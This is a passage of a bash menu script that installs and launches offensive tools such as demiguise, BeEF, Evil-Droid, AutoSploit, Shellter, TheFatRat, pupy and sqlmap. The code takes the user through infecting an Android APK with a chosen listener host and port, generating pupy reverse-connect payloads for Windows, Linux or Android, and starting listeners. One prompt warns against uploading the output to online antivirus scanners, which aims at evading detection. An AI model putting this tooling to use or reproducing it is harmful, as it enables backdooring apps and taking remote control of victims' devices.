]]\n\t\t\tthen\n\t\t\t\tinstall_unibyav\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\n\telif [[ \"$KEYLOG\" = \"23\" ]]\n\tthen\n\t\tif [[ -d /root/demiguise ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"Encryption key: \"\n\t\t\t\tread ENC\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") ShellBrowserWindow\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Outlook.Application\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") Excel.RegisterXLL\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") WbemScripting.SWbemLocator\"\n\t\t\t\techo -e \"Choose payload type: \"\n\t\t\t\tread PT\n\t\t\t\tif [[ \"$PT\" -le 4 && \"$PT\" -ge 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$PT\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tPTT=\"ShellBrowserWindow\"\n\t\t\t\t\telif [[ \"$PT\" = 2 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tPTT=\"Outlook.Application\"\n\t\t\t\t\telif [[ \"$PT\" = 3 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tPTT=\"Excel.RegisterXLL\"\n\t\t\t\t\telif [[ \"$PT\" = 4 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tPTT=\"WbemScripting.SWbemLocator\"\n\t\t\t\t\tfi\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Command to run from HTA: \"\n\t\t\t\t\tread CHTA\n\t\t\t\t\tif [[ \"$CHTA\" = \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tCCHTA=\"\"\n\t\t\t\t\telse\n\t\t\t\t\t\tCCHTA=\"-c \"$CHTA\"\"\n\t\t\t\t\tfi\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Output file name: \"\n\t\t\t\t\tread FN\n\t\t\t\t\tcd /root/demiguise\n\t\t\t\t\tpython demiguise.py -k \"$ENC\" -p \"$PTT\" \"$CCHTA\" -o \"$FN\"\n\t\t\t\t\tif [[ -f /root/demiguise/$FN ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"Output file: /root/demiguise/\"$FN\"\"\n\t\t\t\t\telse\n\t\t\t\t\t\tif [[ -f /root/demiguise/$FN.html ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\techo -e \"Output file: /root/demiguise/\"$FN\".html\"\n\t\t\t\t\t\tfi\n\t\t\t\t\tfi\t\t\t\t\t\n\t\t\t\t\tbreak\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$RS\"Wrong choise\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_demiguise\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"24\" ]]\n\tthen\n\t\tif [[ -d /root/DKMC ]]\n\t\tthen\n\t\t\tcd /root/DKMC\n\t\t\tpython dkmc.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_dkmc\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"25\" ]]\n\tthen\n\t\tif [[ -d /usr/share/beef-xss ]]\n\t\tthen\n\t\t\tcd /usr/share/beef-xss\n\t\t\t./beef\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_beef\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"26\" ]]\n\tthen\n\t\tif [[ -d /root/Evil-Droid ]]\n\t\tthen\n\t\t\tcd /root/Evil-Droid\n\t\t\t./evil-droid\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_evil_droid\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"27\" ]]\n\tthen\n\t\tif [[ -d /root/EggShell ]]\n\t\tthen\n\t\t\tcd /root/EggShell\n\t\t\tpython eggshell.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_eggshell\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"28\" ]]\n\tthen\n\t\tif [[ -d /root/Zerodoor ]]\n\t\tthen\n\t\t\tcd /root/Zerodoor\n\t\t\tpython zerodoor.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_zerodoor\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"29\" ]]\n\tthen\n\t\tif [[ -d /root/cromos ]]\n\t\tthen\n\t\t\tcd /root/cromos\n\t\t\tcromos_menu\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_cromos\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"30\" ]]\n\tthen\n\t\tif [[ -d /root/AutoSploit ]]\n\t\tthen\n\t\t\tcd /root/AutoSploit\n\t\t\tpython autosploit.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_autosploit\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"31\" ]]\n\tthen\n\t\tif [[ -d /root/Enigma ]]\n\t\tthen\n\t\t\tcd /root/Enigma\n\t\t\tpython enigma.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_enigma\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"8\" ]]\n\tthen\n\t\tif [[ -d /root/CHAOS ]]\n\t\tthen\n\t\t\tcd /root/CHAOS\n\t\t\tgo run CHAOS.go\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_chaos\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"9\" ]]\n\tthen\n\t\tif [[ -d /root/kwetza ]]\n\t\tthen\n\t\t\tcd /root/kwetza\n\t\t\tprintf '\\033]2;KWETZA\\a'\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\tif [[ \"$APK\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tAPK=\"\\e[1;31mNONE\\e[m\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$APKLH\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tAPKLH=\"\\e[1;31mNONE\\e[m\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$APKLP\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tAPKLP=\"\\e[1;31mNONE\\e[m\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$APKPROT\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tAPKPROT=\"tcp\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$APKPERM\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tAPKPERM=\"yes\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Apk to infect                      CURRENT:$APK\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") LHOST                              CURRENT:$APKLH\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") LPORT                              CURRENT:$APKLP\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") Protocol                           CURRENT:$APKPROT\"\n\t\t\t\techo -e \"\"$YS\" 5\"$CE\") Add additional permissions         CURRENT:$APKPERM\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"\"$YS\" run\"$CE\") Infect apk\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread APKK\n\t\t\t\tclear\n\t\t\t\tif [[ \"$APKK\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Apk to infect(must be in /root/kwetza): \"\n\t\t\t\t\tread APKTBI\n\t\t\t\t\tif [[ -f \"$APKTBI\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tAPK=\"$APKTBI\"\n\t\t\t\t\telse\n\t\t\t\t\t\techo -e \"\"$RS\"/root/kwetza/\"$APKTBI\" not found\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$APKK\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"LHOST: \"\n\t\t\t\t\tread APKLH\n\t\t\t\telif [[ \"$APKK\" = 3 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"LPORT: \"\n\t\t\t\t\tread APKLP\n\t\t\t\telif [[ \"$APKK\" = 4 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$APKPROT\" = \"tcp\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tAPKPROT=\"https\"\n\t\t\t\t\telse\n\t\t\t\t\t\tAPKPROT=\"tcp\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$APKK\" = 5 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$APKPERM\" = \"yes\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tAPKPERM=\"no\"\n\t\t\t\t\telse\n\t\t\t\t\t\tAPKPERM=\"yes\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$APKK\" = \"back\" || \"$APKK\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$APKK\" = \"run\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$APK\" = \"\\e[1;31mNONE\\e[m\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"No apk specified.\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\t\tif [[ \"$APKLH\" = \"\\e[1;31mNONE\\e[m\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"No LHOST specified.\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\t\tif [[ \"$APKLP\" = \"\\e[1;31mNONE\\e[m\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"No LPORT specified.\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\t\tcd /root/kwetza\n\t\t\t\t\tpython kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM\n\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t$READAK\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_kwetza\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"7\" ]]\n\tthen\n\t\tif [[ -f /usr/bin/shellter ]]\n\t\tthen\n\t\t\tshellter\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_shellter\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"2\" ]]\n\tthen\n\t\tif [[ -d /root/ezsploit ]]\n\t\tthen\n\t\t\tcd /root/ezsploit/\n\t\t\t./ezsploit.sh\n\t\t\tcd\n\t\t\techo -e \"Go to metasploit menu to create a listener(Option \"$YS\"14\"$CE\")\"\n\t\t\tsleep 2\n\t\t\techo -e \"Press \"$YS\"any key\"$CE\" to leave...\"\n\t\t\t$READAK\n\t\t\texec bash \"$0\"\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_ezsploit\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"3\" ]]\n\tthen\n\t\tif [[ -d /root/pupy ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\tclear\n\t\t\techo -e \"\"$YS\" 1\"$CE\") Generate a payload\"\n\t\t\techo -e \"\"$YS\" 2\"$CE\") Start listener\"\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t\t\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\t\t\tread -e PUPY\n\t\t\tif [[ \"$PUPY\" = \"1\" ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\techo -e \"Choose the target OS:\"\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Windows\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Linux\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") Android\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread -e TAROS\n\t\t\t\tif [[ \"$TAROS\" = \"1\" ]]\n\t\t\t\tthen\n\t\t\t\t\tTAROS=\"windows\"\n\t\t\t\telif [[ \"$TAROS\" = \"2\" ]]\n\t\t\t\tthen\n\t\t\t\t\tTAROS=\"linux\"\n\t\t\t\telif [[ \"$TAROS\" = \"3\" ]]\n\t\t\t\tthen\n\t\t\t\t\tTAROS=\"android\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"Wrong choice.Returning to main manu...\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\texec bash \"$0\"\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter your ip: \"\n\t\t\t\tread -e PUPYIP\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter your port(e.g: 443): \"\n\t\t\t\tread -e PUPYPORT\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter the full output path(e.g: /root/Desktop/payload1.exe)\"\n\t\t\t\tread -e PUPYPATH\n\t\t\t\tcd /root/pupy/pupy\n\t\t\t\t./pupygen.py -O $TAROS -o \"$PUPYPATH\" connect --host \"$PUPYIP\":\"$PUPYPORT\"\n\t\t\t\tcd\n\t\t\telif [[ \"$PUPY\" = \"2\" ]]\n\t\t\tthen\n\t\t\t\tcd /root/pupy/pupy\n\t\t\t\t./pupysh.py\n\t\t\telif [[ \"$PUPY\" = \"00\" ]]\n\t\t\tthen\n\t\t\t\texec bash \"$0\"\n\t\t\telif [[ \"$PUPY\" = \"back\" || \"$PUPY\" = \"b\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telif [[ \"$PUPY\" = \"0\" ]]\n\t\t\tthen\n\t\t\t\texit\n\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_pupy\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"4\" ]]\n\tthen\n\t\tif [[ -d /root/zirikatu ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"CAUTION: DO NOT upload it to anti-virus scanners online.\"\n\t\t\tsleep 3\n\t\t\techo -e \"You agree with that?(\"$YS\"YES\"$CE\"/\"$YS\"*\"$CE\")\"\n\t\t\tread MUSTBEYES\n\t\t\tif [[ \"$MUSTBEYES\" = \"YES\" ]] \n\t\t\tthen \n\t\t\t\tclear\n\t\t\t\tcd /root/zirikatu\n\t\t\t\t./zirikatu.sh\n\t\t\t\tcd\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_zirikatu\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"5\" ]]\n\tthen\n\t\tif [[ -d /root/TheFatRat ]]\n\t\tthen\n\t\t\tfatrat\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_thefatrat\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"6\" ]]\n\tthen\n\t\tif [[ -d /root/Winpayloads ]]\n\t\tthen\n\t\t\tcd /root/Winpayloads\n\t\t\t./WinPayloads.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_winpayloads\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"00\" ]]\n\tthen\n\t\tclear\n\t\texec bash \"$0\"\n\telif [[ \"$KEYLOG\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\telif [[ \"$KEYLOG\" = \"back\" || \"$KEYLOG\" = \"b\" ]]\n\tthen\n\t\tbreak\n\tfi\n\techo -e \"$PAKTGB\"\n\t$READAK\n\tdone\n}\nfunction information_gathering\n{\n\twhile true \n\tdo\n\t\tclear\n\t\tTERMINALTITLE=\"INFORMATION GATHERING\"\n\t\tdash_calc\n\t\tprintf '\\033]2;INFORMATION GATHERING\\a'\n\t\tif [[ -d /usr/share/sniper ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 1\"$CE\") Sniper                Automated Pentest Recon Scanner\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 1\"$CE\") \"$RS\"Sniper\"$CE\"                Automated Pentest Recon Scanner\"\n\t\tfi\n\t\tif [[ -d /root/ReconDog ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 2\"$CE\") ReconDog              All in one tool\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 2\"$CE\") \"$RS\"ReconDog\"$CE\"              All in one tool\"\n\t\tfi\n\t\tif [[ -d /root/RED_HAWK ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 3\"$CE\") RED HAWK              All in one tool\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 3\"$CE\") \"$RS\"RED HAWK\"$CE\"              All in one tool\"\n\t\tfi\n\t\tif [[ -d /root/Infoga ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 4\"$CE\") Infoga                Email Information Gathering\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 4\"$CE\") \"$RS\"Infoga\"$CE\"                Email Information Gathering\"\n\t\tfi\n\t\tif [[ -d /root/KnockMail ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 5\"$CE\") KnockMail             Verify if email exists\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 5\"$CE\") \"$RS\"KnockMail\"$CE\"             Verify if email exists\"\n\t\tfi\n\t\tif [[ -d /root/operative-framework ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 6\"$CE\") Operative-framework   Get information on website or target\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 6\"$CE\") \"$RS\"Operative-framework\"$CE\"   Get information on website or target\"\n\t\tfi\n\t\tif [[ -d /root/osrframework ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 7\"$CE\") Osrfconsole           Perform accurate online researches\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 7\"$CE\") \"$RS\"Osrfconsole\"$CE\"           Perform accurate online researches\"\n\t\tfi\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t\techo -e \"Choose: \"\n\t\tread INFOG\n\t\tclear\n\t\tif [[ \"$INFOG\" = 1 ]]\n\t\tthen\n\t\t\tif [[ -d /usr/share/sniper ]]\n\t\t\tthen\n\t\t\t\techo -e \"Enter the domain you want to scan: \"\n\t\t\t\tread DOMAIN\n\t\t\t\tclear\n\t\t\t\tsniper $DOMAIN\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_sniper\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = 2 ]]\n\t\tthen\n\t\t\tif [[ -d /root/ReconDog ]]\n\t\t\tthen\n\t\t\t\tcd /root/ReconDog\n\t\t\t\tpython dog.py\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_recondog\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = 3 ]]\n\t\tthen\n\t\t\tif [[ -d /root/RED_HAWK ]]\n\t\t\tthen\n\t\t\t\tcd /root/RED_HAWK\n\t\t\t\tphp rhawk.php\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_redhawk\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = 4 ]]\n\t\tthen\n\t\t\tif [[ -d /root/Infoga ]]\n\t\t\tthen\n\t\t\t\techo -e \"Domain to search:\"\n\t\t\t\tread INFOTARG\n\t\t\t\techo -e \"Data source(e.g. \"$YS\"all\"$CE\",\"$YS\"google\"$CE\",\"$YS\"bing\"$CE\",\"$YS\"yahoo\"$CE\",\"$YS\"pgp\"$CE\"): \"\n\t\t\t\tread INFOSOUR\n\t\t\t\tclear\n\t\t\t\tcd /root/Infoga\n\t\t\t\tpython infoga.py -t $INFOTARG -s $INFOSOUR \n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_infoga\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = 5 ]]\n\t\tthen\n\t\t\tif [[ -d /root/KnockMail ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\tcd /root/KnockMail\n\t\t\t\tpython2.7 knock.py\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_knockmail\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = 6 ]]\n\t\tthen\n\t\t\tif [[ -d /root/operative-framework ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\tcd /root/operative-framework\n\t\t\t\tpython2.7 operative.py\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_operative\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = \"7\" ]]\n\t\tthen\n\t\t\tif [[ -d \"/root/hakkuframework\" ]]\n\t\t\tthen\n\t\t\t\twhile true\n\t\t\t\tdo\n\t\t\t\t\tprintf '\\033]2;OSRFCONSOLE\\a'\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") usufy\"\n\t\t\t\t\techo -e \"\"$YS\" 2\"$CE\") mailfy\"\n\t\t\t\t\techo -e \"\"$YS\" 3\"$CE\") searchfy\"\n\t\t\t\t\techo -e \"\"$YS\" 4\"$CE\") domainfy\"\n\t\t\t\t\techo -e \"\"$YS\" 5\"$CE\") phonefy\"\n\t\t\t\t\techo -e \"\"$YS\" 6\"$CE\") entify\"\n\t\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\t\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t\t\t\t#\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\t\t\t\t\techo -e \"Choose: \"\n\t\t\t\t\tread -e OSFR\n\t\t\t\t\tclear\n\t\t\t\t\tif [[ \"$OSFR\" = \"1\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"Use: usufy.py -n name1 name2 -p twitter facebook\"\n\t\t\t\t\t\tusufy.py\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"2\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"Use: mailfy.py -n name1\"\n\t\t\t\t\t\tmailfy.py\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"3\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tsearchfy.py\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"4\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tdomainfy.py\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"5\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tphonefy.py\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"6\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tentify.py\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"0\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$OSFR\" = \"00\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\texec bash \"$0\"\n\t\t\t\t\telif [[ \"$OSFR\" = \"back\" || \"$OSFR\" = \"b\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tbreak\n\t\t\t\t\telse \n\t\t\t\t\t\techo -e \"Wrong choice\"\n\t\t\t\t\t\tsleep 0.3\n\t\t\t\t\t\tclear\n\t\t\t\t\t\texec bash \"$0\"\n\t\t\t\t\tfi\n\t\t\t\tdone\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_osrframework\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$INFOG\" = 0 ]]\n\t\tthen\n\t\t\texit\n\t\telif [[ \"$INFOG\" = 00 ]]\n\t\tthen\n\t\t\texec bash $0\n\t\telif [[ \"$INFOG\" = \"back\" || \"$INFOG\" = \"b\" ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\tdone\n}\nfunction website_tools\n{\n\twhile true \n\tdo\n\t\tclear\n\t\tTERMINALTITLE=\"WEBSITE TOOLS\"\n\t\tdash_calc\n\t\tprintf '\\033]2;WEBSITE TOOLS\\a'\n\t\tif [[ -f /usr/bin/sqlmap ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 1\"$CE\") SQLmap                Automatic SQL injection and database takeover tool\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 1\"$CE\") \"$RS\"SQLmap\"$CE\"                Automatic SQL injection and database takeover tool\"\n\t\tfi\n\t\tif [[ -d /root/leviathan ]]\n\t\tthen\n\t\t\techo -e 